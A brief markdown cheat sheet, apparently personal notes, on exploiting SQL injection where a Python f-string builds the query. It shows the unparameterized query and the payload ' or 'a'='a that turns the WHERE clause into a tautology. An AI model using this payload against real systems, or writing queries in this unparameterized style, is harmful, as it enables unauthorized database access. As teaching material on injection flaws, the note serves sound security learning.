# Check Missing Paramaterization

## Not properly paramaterized
`query = f"SELECT username, created_at FROM users WHERE username='{inputVarHere}'"`

## Creating Payload
You can use a Database Fiddle site to craft your query first

## Exploit
Mess with the input variable to create the query you want.
You can pass something like `' or 'a'='a`
The first single quote will escape, and you leave off the last single quote
`query = f"SELECT username, created_at FROM users WHERE username='' or 'a'='a'"`
